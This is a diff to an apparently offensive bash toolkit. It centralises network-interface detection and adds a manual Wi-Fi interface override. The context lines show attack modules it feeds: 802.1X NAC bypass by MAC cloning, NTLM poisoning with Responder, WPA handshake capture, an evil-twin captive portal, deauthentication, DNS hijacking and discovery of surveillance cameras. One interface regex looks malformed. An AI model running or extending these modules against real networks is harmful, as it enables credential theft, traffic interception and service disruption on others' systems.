@@ -19,6 +19,30 @@ NEON_BLUE='\e[1;34m'
 NEON_PINK='\e[1;35m'
 RESET='\e[0m'
 
+# --- INTERFACE DETECTION ---
+get_wifi_iface() {
+    # Check for override first
+    if [ ! -z "$WIFI_IFACE_OVERRIDE" ]; then
+        echo "$WIFI_IFACE_OVERRIDE"
+        return
+    fi
+    # Prioritize USB Adapters (wlx or wlan) over internal (wlp)
+    local iface=$(ip link | grep -oE "wlx[0-9a-f]{12}|wlan[0-9]" | head -n 1)
+    if [ -z "$iface" ]; then
+        iface=$(ip link | grep -oE "wlp[0-s]+" | head -n 1)
+    fi
+    echo "$iface"
+}
+
+get_main_iface() {
+    # Prioritize Ethernet then Wireless
+    local iface=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    if [ -z "$iface" ]; then
+        iface=$(get_wifi_iface)
+    fi
+    echo "$iface"
+}
+
 # --- CORE ENGINE ---
 
 req() {
@@ -45,8 +69,7 @@ loading_anim() {
 # --- PHANTOM TIER MODULES ---
 
 ghost_insertion() {
-    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
-    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    local INTERFACE=$(get_main_iface)
     
     echo -e "${NEON_PINK}[!] INITIATING FORCE-SILENCE GHOSTING: $INTERFACE${RESET}"
     echo -e "${NEON_BLUE}[*] Killing system networking interference...${RESET}"
@@ -71,8 +94,7 @@ ghost_insertion() {
 }
 
 ghost_restore() {
-    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
-    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    local INTERFACE=$(get_main_iface)
     
     echo -e "${NEON_BLUE}[!] RESTORING STANDARD LINK: $INTERFACE${RESET}"
     echo -e "${NEON_BLUE}[*] Re-enabling system networking management...${RESET}"
@@ -88,8 +110,7 @@ ghost_restore() {
 
 direct_link_disco() {
     echo -e "${NEON_PINK}[!] INITIATING DIRECT-LINK DISCOVERY (PASSIVE/ACTIVE)...${RESET}"
-    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
-    if [ -z "$INTERFACE" ]; then INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1); fi
+    local INTERFACE=$(get_main_iface)
     
     echo -e "${NEON_BLUE}[*] Sniffing peer identities on $INTERFACE...${RESET}"
     # Improved parsing to extract IP and MAC directly from DHCP/ARP/MDNS
@@ -115,7 +136,7 @@ wpad_audit() {
 
 nac_bypass() {
     echo -e "${NEON_PINK}[!] 802.1X NAC BYPASS (MAC CLONING)${RESET}"
-    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    local INTERFACE=$(get_main_iface)
     echo -e "${NEON_BLUE}[*] Sniffing for CDP/LLDP/STP frames to map trusted infrastructure...${RESET}"
     # Capture more frames to increase chance of finding trusted device MACs
     sudo timeout 60 tcpdump -i "$INTERFACE" -nn -e -v -s 1500 '(ether[12:2]=0x88cc or ether[20:2]=0x2000 or ether proto 0x8808)' 2>/dev/null > /tmp/nac_sniff.txt
@@ -141,7 +162,7 @@ nac_bypass() {
 
 ntlm_poison() {
     echo -e "${NEON_PINK}[!] NTLM POISONING & CAPTURE (RESPONDER)${RESET}"
-    local INTERFACE=$(ip link | grep -E "eth|enp|eno" | awk '{print $2}' | tr -d ':' | head -n 1)
+    local INTERFACE=$(get_main_iface)
     if [ ! -d "/opt/Responder" ]; then echo -e "${NEON_PINK}[!] Responder not installed at /opt/Responder${RESET}"; return; fi
     echo -e "${NEON_BLUE}[*] Launching Responder (Analysis & Capture) on $INTERFACE...${RESET}"
     sudo python3 /opt/Responder/Responder.py -I "$INTERFACE" -wrf -v
@@ -402,9 +423,25 @@ dns_hijack() {
 
 # --- SIGINT & WIRELESS MODULES ---
 
+set_wifi_iface() {
+    echo -e "${NEON_BLUE}[*] AVAILABLE WIRELESS INTERFACES:${RESET}"
+    ip link show | grep -E "wlx|wlan|wlp" | awk '{print $2}' | tr -d ':' | nl
+    echo -ne "\n${NEON_BLUE}    Enter interface name to use (e.g. wlx00c0cab7d724): ${RESET}"; read iface
+    if [ ! -z "$iface" ]; then
+        WIFI_IFACE_OVERRIDE="$iface"
+        echo -e "${NEON_BLUE}[+] Interface override set to: $WIFI_IFACE_OVERRIDE${RESET}"
+        # Save to config for persistence
+        if grep -q "WIFI_IFACE_OVERRIDE" "$CONFIG_FILE"; then
+            sed -i "s/WIFI_IFACE_OVERRIDE=.*/WIFI_IFACE_OVERRIDE=\"$iface\"/" "$CONFIG_FILE"
+        else
+            echo "WIFI_IFACE_OVERRIDE=\"$iface\"" >> "$CONFIG_FILE"
+        fi
+    fi
+}
+
 wifi_handshake() {
     echo -e "${NEON_PINK}[!] INITIATING WPA HANDSHAKE CAPTURE${RESET}"
-    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    local INTERFACE=$(get_wifi_iface)
     if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
     
     echo -e "${NEON_BLUE}[*] Enabling Monitor Mode on $INTERFACE...${RESET}"
@@ -429,7 +466,7 @@ wifi_handshake() {
 
 evil_twin_start() {
     echo -e "${NEON_PINK}[!] INITIATING EVIL TWIN CAPTIVE PORTAL${RESET}"
-    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    local INTERFACE=$(get_wifi_iface)
     if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
     
     echo -ne "${NEON_BLUE}    Enter SSID to spoof: ${RESET}"; read ssid
@@ -440,7 +477,7 @@ evil_twin_start() {
 
 wifi_deauth() {
     echo -e "${NEON_PINK}[!] INITIATING DEAUTH ATTACK${RESET}"
-    local INTERFACE=$(ip link | grep "wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+    local INTERFACE=$(get_wifi_iface)
     if [ -z "$INTERFACE" ]; then echo -e "${NEON_PINK}[-] No wireless interface found.${RESET}"; return; fi
     
     echo -ne "${NEON_BLUE}    Target BSSID: ${RESET}"; read bssid
@@ -561,7 +598,7 @@ flock_finder() {
     fi
 
     echo -e "\n${NEON_BLUE}[2] Local Network Discovery (ARP/OUI)${RESET}"
-    local INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
+    local INTERFACE=$(get_main_iface)
     # Known Flock/Lantronix/Lite-On OUI Prefixes
     local flock_ouis=("82:6B:F2" "EC:62:60" "74:4C:A1" "9C:2F:9D" "BC:CF:CC" "D0:53:49")
     
@@ -798,6 +835,7 @@ gui_sigint() {
         echo -e " ${NEON_BLUE}┌─ SIGNAL INTELLIGENCE (SIGINT) ──────────────────────────────┐${RESET}"
         echo -e " ${NEON_BLUE}│${RESET} [W] WIFI DEAUTH     [H] HANDSHAKE CAP   [E] EVIL TWIN       ${NEON_BLUE}│${RESET}"
         echo -e " ${NEON_BLUE}│${RESET} [B] BLUETOOTH RECON [S] SNIFFER         [K] KILL CONNECTION ${NEON_BLUE}│${RESET}"
+        echo -e " ${NEON_BLUE}│${RESET} [I] IFACE SETUP (MANUAL)                                    ${NEON_BLUE}│${RESET}"
         echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
         echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
         read sub; if [[ "$sub" == "b" ]]; then return; fi
@@ -808,6 +846,7 @@ gui_sigint() {
             B|b) bash "$0" bt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             S|s) bash "$0" sniff; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
             K|k) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
+            I|i) bash "$0" set_iface; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
         esac
     done
 }
@@ -857,7 +896,7 @@ STEALTH_DELAY=0
 cleanup_on_exit() {
     # Only run cleanup if we are in the main GUI session (no arguments passed)
     if [ -z "$1" ] || [ "$1" == "EXIT" ]; then
-        local INTERFACE=$(ip link | grep -E "eth|enp|wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
+        local INTERFACE=$(get_main_iface)
         if [ ! -z "$INTERFACE" ]; then
             if [[ $(ip link show $INTERFACE | grep "PROMISC") ]] || [[ $(cat /proc/sys/net/ipv6/conf/$INTERFACE/disable_ipv6) -eq 1 ]]; then
                 echo -e "\n${NEON_BLUE}[!] SESSION CLOSED. AUTO-RESTORING LINK...${RESET}"
@@ -1021,6 +1060,7 @@ elif [[ "$TARGET" == "deauth" ]]; then TYPE="DEAUTH"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "handshake" ]]; then TYPE="HANDSHAKE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "evil_twin" ]]; then TYPE="EVIL_TWIN"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "bt" ]]; then TYPE="BT"; TARGET=$EXTRA;
+elif [[ "$TARGET" == "set_iface" ]]; then TYPE="SET_IFACE"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "flock" ]]; then TYPE="FLOCK"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "foxhunt" ]]; then TYPE="FOXHUNT"; TARGET=$EXTRA;
 elif [[ "$TARGET" == "flock_manual" ]]; then TYPE="FLOCK_MANUAL"; TARGET=$EXTRA;
@@ -1098,6 +1138,7 @@ case $TYPE in
     HANDSHAKE) wifi_handshake ;;
     EVIL_TWIN) evil_twin_start ;;
     BT) bt_recon ;;
+    SET_IFACE) set_wifi_iface ;;
     FLOCK) flock_finder ;;
     FOXHUNT) flock_foxhunt ;;
     FLOCK_MANUAL) flock_intel_offline ;;
